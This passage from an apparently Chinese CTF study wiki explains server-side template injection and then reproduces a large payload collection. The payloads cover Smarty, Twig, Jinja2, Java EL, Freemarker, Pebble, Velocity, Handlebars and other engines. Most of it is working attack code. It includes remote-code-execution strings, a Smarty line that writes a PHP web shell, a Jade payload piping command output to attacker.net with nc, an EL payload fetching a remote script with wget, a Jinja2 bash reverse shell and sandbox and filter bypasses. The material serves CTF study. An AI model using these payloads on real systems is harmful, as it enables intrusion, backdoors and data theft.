<p>\u901a\u8fc7self\u83b7\u53d6Smarty\u7c7b\u518d\u8c03\u7528\u5176\u9759\u6001\u65b9\u6cd5\u5b9e\u73b0\u6587\u4ef6\u8bfb\u5199\u88ab\u7f51\u4e0a\u5f88\u591a\u6587\u7ae0\u91c7\u7528\u3002</p> <p>Smarty\u7c7b\u7684getStreamVariable\u65b9\u6cd5\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>public function getStreamVariable($variable){        $_result = '';        $fp = fopen($variable, 'r+');        if ($fp) {            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) {                $_result .= $current_line;            }            fclose($fp);            return $_result;        }        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;        if ($smarty-&gt;error_unassigned) {            throw new SmartyException('Undefined stream variable \"' . $variable . '\"');        } else {            return null;        }    }\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u6587\u4ef6\u5e76\u8fd4\u56de\u5176\u5185\u5bb9\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528self\u6765\u83b7\u53d6Smarty\u5bf9\u8c61\u5e76\u8c03\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u5f88\u591a\u6587\u7ae0\u91cc\u7ed9\u7684payload\u90fd\u5f62\u5982\uff1a{self::getStreamVariable(\u201cfile:///etc/passwd\u201d)}\u3002</p> <p>Smarty\u7684{if}\u6761\u4ef6\u5224\u65ad\u548cPHP\u7684if\u975e\u5e38\u76f8\u4f3c\uff0c\u53ea\u662f\u589e\u52a0\u4e86\u4e00\u4e9b\u7279\u6027\u3002\u6bcf\u4e2a{if}\u5fc5\u987b\u6709\u4e00\u4e2a\u914d\u5bf9\u7684{/if}\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528{else} \u548c {elseif}\uff0c\u5168\u90e8\u7684PHP\u6761\u4ef6\u8868\u8fbe\u5f0f\u548c\u51fd\u6570\u90fd\u53ef\u4ee5\u5728if\u5185\u4f7f\u7528\uff0c\u5982||, or, &amp;&amp;, and, is_array(), \u7b49\u7b49\uff0c\u5982\uff1a{if is_array($array)}{/if}\u90a3\u4e48\u540c\u6837\u7684\uff0c\u5728\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d{ifsystem(\u2018cat \\flag\u2019)}{/if},\u4ea6\u6216\u8005\u662f{if readfile (\u2018/flag\u2019)}{/if}</p> <p>\u5927\u6982\u5c31\u8fd9\u4e48\u70b9\u4e86\uff0c\u5bf9\u4e86\u4f8b\u9898\uff1a\uff08\u81ea\u5df1\u53bb\u641c\u641c\uff09</p> <p>CISCN2019\u534e\u4e1c\u5357\u8d5b\u533aWeb11</p> <p>[BJDCTF2020]The mystery of ip</p>"},{"location":"web/ssti/php/#twig","title":"twig","text":"<p>\u53e6\u5916\u4e00\u4e2aphp\u6a21\u677f\uff0c\u5176\u5b9e\u6709\u4e09\u4e2a\uff0c\u8fd9\u91cc\u53ea\u5199\u4e86\u4e24\u4e2a\uff0c\u5269\u4e0b\u7684\u90a3\u4e2a\u5b9e\u5728\u662f\u6ca1\u6709\u9047\u89c1\u8fc7</p> <p>\u8fd9\u4e2a\u4e5f\u633a\u5c11\u89c1\u7684\uff08\u5bf9\u6211\u6765\u8bf4</p> <p>\u6240\u4ee5\u6211\u66f4\u503e\u5411\u4e8e~\u53ea\u80fd~\u653e\u4e00\u4e9b\u66b4\u529b\u4e00\u70b9\u7684payload\u4e86</p> <pre><code>Twig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\n\u55ef\u662f\u7684\uff0c\u6ca1\u9519\uff0c\u5c31\u662f\u8fd9\u6837\uff08\u6307\u767d\u5ad6\u602a\uff09\nPlain Text\n</code></pre> <p>\u6765\u81eagithub\u4e0a\u67d0\u4f4d\u8001\u54e5\u7684\u6770\u4f5c\u3002</p>"},{"location":"web/ssti/%E6%9A%B4%E5%8A%9Bpayload/","title":"\u66b4\u529bpayload","text":"<p>\u6a21\u677f\u592a\u591a\uff0c\u5b66\u7684\u4e1c\u897f\u53c8\u592a\u5c11\uff1f</p> <p>\u8fd8\u5728\u62c5\u5fc3\u78b0\u5230\u65b0\u6a21\u677f\u4e0d\u4f1a\u505a\uff1f</p> <p>\u5bb3\u6015\u8fd9\u5f20\u56fe\uff1f</p> <p>\u66b4\u529b\u771f\u7684\u80fd\u591f\u89e3\u51b3\u5f88\u591a\u95ee\u9898\uff08\u6211\u7ed9\u4eba\u5bb6\u6574\u4e2a\u642c\u8fd0\u8fc7\u6765\u4e86\uff09</p> <pre><code>\u6765\u6e90\uff1ahttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twigRuby\nRuby - Basic injections\nERB:\n&lt;%= 7 * 7 %&gt;\nSlim:\n#{ 7 * 7 }\nRuby - Retrieve /etc/passwd\n&lt;%= File.open('/etc/passwd').read %&gt;\nRuby - List files and directories\n&lt;%= Dir.entries('/') %&gt;\nRuby - Code execution\nExecute code using SSTI for ERB engine.\n&lt;%= system('cat /etc/passwd') %&gt;\n&lt;%= `ls /` %&gt;\n&lt;%= IO.popen('ls /').readlines()  %&gt;\n&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;\n&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;\nExecute code using SSTI for Slim engine.\n#{ %x|env| }\nJava\nJava - Basic injection\n${7*7}\n${{7*7}}\n${class.getClassLoader()}\n${class.getResource(\"\").getPath()}\n${class.getResource(\"../../../../../index.htm\").getContent()}\nJava - Retrieve the system\u2019s environment variables\n${T(java.lang.System).getenv()}\nJava - Retrieve /etc/passwd\n${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}\n${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\nExpression Language EL\nExpression Language EL - Basic injection\n${1+1}\n#{1+1}\nExpression Language EL - Code Execution\n// Common RCE payloads\n''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(&lt;COMMAND STRING/ARRAY&gt;)\n''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(&lt;COMMAND ARRAY/LIST&gt;).start()\n// Method using Runtime\n#{session.setAttribute(\"rtc\",\"\".getClass().forName(\"java.lang.Runtime\").getDeclaredConstructors()[0])}\n#{session.getAttribute(\"rtc\").setAccessible(true)}\n#{session.getAttribute(\"rtc\").getRuntime().exec(\"/bin/bash -c whoami\")}\n// Method using processbuilder\n${request.setAttribute(\"c\",\"\".getClass().forName(\"java.util.ArrayList\").newInstance())}\n${request.getAttribute(\"c\").add(\"cmd.exe\")}\n${request.getAttribute(\"c\").add(\"/k\")}\n${request.getAttribute(\"c\").add(\"ping x.x.x.x\")}\n${request.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.ProcessBuilder\").getDeclaredConstructors()[0].newInstance(request.getAttribute(\"c\")).start())}\n${request.getAttribute(\"a\")}\n// Method using Reflection &amp; Invoke\n${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")}\n// Method using ScriptEngineManager one-liner\n${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\\\\"ping x.x.x.x\\\\\\\")\"))}\n// Method using ScriptEngineManager\n${facesContext.getExternalContext().setResponseHeader(\"output\",\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\\\"var x=new java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))}\nTwig\nTwig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\nSmarty\n{$smarty.version}\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php passthru($_GET['cmd']); ?&gt;\",self::clearConfig())}\nFreemarker\nYou can try your payloads at https://try.freemarker.apache.org\nFreemarker - Basic injection\nThe template can be ${3*3} or the legacy #{3*3}\nFreemarker - Code execution\n&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\nFreemarker - Sandbox bypass\n\u26a0\ufe0f only works on Freemarker versions below 2.3.30\n&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;\n&lt;#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")&gt;\n&lt;#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)&gt;\n&lt;#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")&gt;\n${dwf.newInstance(ec,null)(\"id\")}\nPebble\nPebble - Basic injection\n{{ someString.toUPPERCASE() }}\nPebble - Code execution\nOld version of Pebble ( &lt; version 3.0.9): {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}.\nNew version of Pebble :\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n.forName('java.lang.Runtime')\n.methods[6]\n.invoke(null,null)\n.exec(cmd)\n.inputStream\n.readAllBytes() %}\n{{ (1).TYPE\n.forName('java.lang.String')\n.constructors[0]\n.newInstance(([bytes]).toArray()) }}\nJade / Codepen\n- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\nVelocity\n#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\nMako\n&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n${x}\nJinja2\nOfficial website\nJinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.\nJinja2 - Basic injection\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\nJinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on Flask application.\nJinja2 - Template format\n{% extends \"layout.html\" %}\n{% block body %}\n&lt;ul&gt;\n{% for user in users %}\n&lt;li&gt;&lt;a href=\"{{ user.url }}\"&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;\n{% endfor %}\n&lt;/ul&gt;\n{% endblock %}\nJinja2 - Debug Statement\nIf the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger.\n&lt;pre&gt;{% debug %}&lt;/pre&gt;\nSource: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement\nJinja2 - Dump all used classes\n{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n{{ ''.__class__.__mro__[2].__subclasses__() }}\nJinja2 - Dump all config variables\n{% for key, value in config.iteritems() %}\n&lt;dt&gt;{{ key|e }}&lt;/dt&gt;\n&lt;dd&gt;{{ value|e }}&lt;/dd&gt;\n{% endfor %}\nJinja2 - Read remote file\n# ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}\nJinja2 - Write into remote file\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}\nJinja2 - Remote Code Execution\nListen for connection\nnc -lnvp 8000\nExploit the SSTI by calling subprocess.Popen.\n\u26a0\ufe0f the number 396 will vary depending of the application.\n{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\nExploit the SSTI by calling Popen without guessing the offset\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\nSimply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &amp;input=ls)\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\nExploit the SSTI by writing an evil config file.\n# evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg') }}\n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1\"',shell=True) }}\nJinja2 - Filter bypass\nrequest.__class__\nrequest[\"__class__\"]\nBypassing _\nhttp://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\nBypassing [ and ]\nhttp://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_\nor\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_\nBypassing |join\nhttp://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_\nBypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\nJinjava\nJinjava - Basic injection\n{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206\nJinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/\nJinjava - Command execution\nFixed by https://github.com/HubSpot/jinjava/pull/230\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\nHandlebars\nHandlebars - Command Execution\n{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('ls -la');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}\nASP.NET Razor\nASP.NET Razor - Basic injection\n@(1+2)\nASP.NET Razor - Command execution\n@{\n// C# code\n}\nPlain Text\n</code></pre>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"SSTI","text":""},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_1","title":"\u5b9a\u4e49\u4ee5\u53ca\u7406\u89e3","text":"<p>\u6a21\u677f\u6ce8\u5165\u6d89\u53ca\u7684\u662f\u670d\u52a1\u7aefWeb\u5e94\u7528\u4f7f\u7528\u6a21\u677f\u5f15\u64ce\u6e32\u67d3\u7528\u6237\u8bf7\u6c42\u7684\u8fc7\u7a0b</p> <p>\u6a21\u7248\u5f15\u64ce\u4e00\u822c\u90fd\u9ed8\u8ba4\u5bf9\u6e32\u67d3\u7684\u53d8\u91cf\u503c\u8fdb\u884c\u7f16\u7801\u548c\u8f6c\u4e49\uff0c\u6240\u4ee5\u5e76\u4e0d\u4f1a\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002</p> <p>\u5982\u679c\u670d\u52a1\u7aef\u5c06\u7528\u6237\u7684\u8f93\u5165\u4f5c\u4e3a\u4e86\u6a21\u677f\u7684\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\u5728\u9875\u9762\u6e32\u67d3\u65f6\u4e5f\u5fc5\u5b9a\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9</p> <p>\u8fdb\u884c\u6a21\u7248\u7f16\u8bd1\u548c\u89e3\u6790\u6700\u540e\u8f93\u51fa\u3002</p> <p>\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4f60\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u52a8\u6001\u751f\u6210HTML\u9875\u9762\uff0c\u770b\u8d77\u6765\u8ddf\u9759\u6001HTML\u9875\u9762\u4e00\u6837\u3002</p> <p>\u9996\u5148\u6211\u4eec\u5148\u8bb2\u89e3\u4e0b\u4ec0\u4e48\u662f\u6a21\u677f\u5f15\u64ce\uff0c\u4e3a\u4ec0\u4e48\u9700\u8981\u6a21\u677f\uff0c\u6a21\u677f\u5f15\u64ce\u53ef\u4ee5\u8ba9\uff08\u7f51\u7ad9\uff09\u7a0b\u5e8f\u5b9e\u73b0\u754c\u9762\u4e0e\u6570\u636e\u5206\u79bb\uff0c\u4e1a\u52a1\u4ee3\u7801\u4e0e\u903b\u8f91\u4ee3\u7801\u7684\u5206\u79bb\uff0c\u8fd9\u5927\u5927\u63d0\u5347\u4e86\u5f00\u53d1\u6548\u7387\uff0c\u826f\u597d\u7684\u8bbe\u8ba1\u4e5f\u4f7f\u5f97\u4ee3\u7801\u91cd\u7528\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u3002\u4f46\u662f\u5f80\u5f80\u65b0\u7684\u5f00\u53d1\u90fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5b89\u5168\u95ee\u9898\uff0c\u867d\u7136\u6a21\u677f\u5f15\u64ce\u4f1a\u63d0\u4f9b\u6c99\u7bb1\u673a\u5236\uff0c\u4f46\u540c\u6837\u5b58\u5728\u6c99\u7bb1\u9003\u9038\u6280\u672f\u6765\u7ed5\u8fc7\u3002</p> <p>\uff08\u5feb\u6377\u65b9\u4fbf------&gt;\u627f\u62c5\u98ce\u9669\uff09</p> <p>\u6240\u4ee5\u6f0f\u6d1e\u7684\u6765\u6e90\u8fd8\u662f\u90a3\u4e00\u4e2a\uff1a\u8fc7\u4e8e\u4fe1\u4efb\u7528\u6237\u6240\u8f93\u5165\u7684\u6570\u636e\u3002</p> <p></p> <p>\u796d\u51fa\u8fd9\u5f20\u7ecf\u5178\u7684\u56fe\uff0c\u7ecf\u5e38\u7528\u6765\u5224\u65ad\u6a21\u677f\u7c7b\u578b</p> <p>\u9700\u8981\u5173\u6ce8\u7684\u70b9\uff1a{{7*\u20187\u2019}}</p> <p>Jinja2\u8f93\u51fa\u4e3a49</p> <p>TWIG\u8f93\u51fa\u4e3a7777777</p> <p>\u90a3\u4e48\u5230\u5e95\u8fd9\u4e2a\u4e1c\u897f\u80fd\u5e72\u561b\u5462\uff1f</p> <p>\u5148\u7ed9\u51fa\u521d\u6b65\u5370\u8c61\uff08jinja2\uff09\uff1a</p> <p>\u7528\u6237\u8f93\u5165{{7+7}}</p> <p>\u7136\u540e\u670d\u52a1\u5668\u5e2e\u4f60\u8fd0\u884c{{}}\u4e2d\u7684\u4ee3\u7801\uff0c\u7b97\u51fa\u6765=49.</p> <p>\u5c31\u662f\u76f8\u5f53\u4e8e\u670d\u52a1\u5668\u5e2e\u4f60\u89e3\u6790\u8fd0\u884c\u4e86\u4f60\u8f93\u5165\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5982\u679c\u8f93\u5165\u7684\u662f\u6076\u610f\u7684\u4ee3\u7801........</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_2","title":"\u57fa\u7840\u8bed\u6cd5","text":"<p>\u89c9\u5f97\u5199\u7684\u592a\u5c11\u4e86\u60f3\u6dfb\u52a0\u6b22\u8fce\u3002</p> <pre><code>{% ... %} for Statements\n{{ ... }} for Expressions to print to the template output\n{# ... #} for Comments not included in the template output\n#  ... # for Line Statements\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u662f\u5b98\u65b9\u6587\u6863\u7684\u4ecb\u7ecd</p> <p>{%%}\u53ef\u4ee5\u7528\u6765\u58f0\u660e\u53d8\u91cf\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5faa\u73af\u8bed\u53e5\u548c\u6761\u4ef6\u8bed\u53e5\u3002</p> <p>{{}}\u7528\u4e8e\u5c06\u8868\u8fbe\u5f0f\u6253\u5370\u5230\u6a21\u677f\u8f93\u51fa</p> <p>{##}\u8868\u793a\u672a\u5305\u542b\u5728\u6a21\u677f\u8f93\u51fa\u4e2d\u7684\u6ce8\u91ca</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_3","title":"\u53ef\u4ee5\u6709\u548c{%%}\u76f8\u540c\u7684\u6548\u679c","text":"<pre><code>{% set x= 'abcd' %}  \u58f0\u660e\u53d8\u91cf\n{% for i in ['a','b','c'] %}{{i}}{%endfor%} \u5faa\u73af\u8bed\u53e5\n{% if 25==5*5 %}{{1}}{% endif %}  \u6761\u4ef6\u8bed\u53e5\nPlain Text\n</code></pre> <pre><code># for i in ['a','1']{{ i }}# endfor\n{% for i in ['a','1'] %}{{ item }}{% endfor %}\n\u8fd9\u4e24\u6761\u662f\u7b49\u6548\u7684\uff0c\u4f46\u662f\u6709\u4e2a\u524d\u63d0\uff0c\u5fc5\u987b\u5728environment\u4e2d\u914d\u7f6eline_statement_prefix\u5373app.jinja_env.line_statement_prefix=\"#\"\nPlain Text\n</code></pre> <p>You can use a dot (.) to access attributes of a variable in addition to the standard Python getitem \u201csubscript\u201d syntax ([]). --\u5b98\u65b9\u539f\u6587</p> <p>\u9664\u4e86\u6807\u51c6\u7684python\u8bed\u6cd5\u4f7f\u7528\u70b9<code>\uff08.\uff09</code>\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e2d\u62ec\u53f7<code>\uff08[]\uff09</code>\u6765\u8bbf\u95ee\u53d8\u91cf\u7684\u5c5e\u6027\u3002</p> <pre><code>{{\"\".__class__}}\n{{\"\"['__classs__']}}\nPlain Text\n</code></pre> <p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u7ed5\u8fc7\u3002</p> <p>\u6709\u4e9b\u9898\u76ee\u4f1a\u5199\u7684\u5f88\u957f\uff0c\u4e0d\u59a8\u62ff\u4e2a\u8fc7\u6765\u770b\u770b\uff0c\u5982\u679c\u80fd\u770b\u61c2\u90a3\u57fa\u7840\uff08\u751a\u81f3\u662f\u8fdb\u9636\uff09\u90e8\u5206\u5e94\u8be5\u5c31\u6ca1\u4ec0\u4e48\u95ee\u9898\u4e86\u3002</p> <pre><code>{% set id=dict(ind=a,ex=a)|join%}#\u5229\u7528join\u8fc7\u6ee4\u5668\u62fc\u63a5\u6210index\uff0c\u4e0b\u9762\u51e0\u4e2a\u7c7b\u4f3c\n{% set pp=dict(po=a,p=a)|join%}\n{% set ls=dict(ls=a)|join%}\n{% set ppe=dict(po=a,pen=a)|join%}\n{% set gt=dict(ge=a,t=a)|join%}\n{% set cr=dict(ch=a,r=a)|join%}\n{% set nn=dict(n=a)|join%}\n{% set tt=dict(t=a)|join%}\n{% set ff=dict(f=a)|join%}\n{% set ooqq=dict(o=a,s=a)|join %}\n{% set rd=dict(re=a,ad=a)|join%}\n{% set five=(lipsum|string|list)|attr(id)(tt) %}#\u8fd9\u91cc\u7528lipsum\u8fc7\u6ee4\u5668\u6700\u7ec8\u80fd\u591f\u53d6\u5f97\u6570\u5b575{\u5177\u4f53\u6d41\u7a0b\uff1a\u751f\u6210\u968f\u673a\u6570\u5b57-&gt;\u5b57\u7b26\u4e32\u5217\u8868\u8f93\u51fa-&gt;index(\"f\")\u627e\u5b57\u7b26'f'\u5728\u751f\u6210\u7684\u5217\u8868\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e..}\uff08lorem\u00a0is not just a normal snippet\u2014it\u2019s actually a\u00a0generator. Every time you expand it, it will generate a 30-words dummy text, splitted into a few sentences.\uff09\n{% set three=(lipsum|string|list)|attr(id)(nn) %}\n{% set one=(lipsum|string|list)|attr(id)(ff) %}\n{% set shiba=five*five-three-three-one %}\n{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) 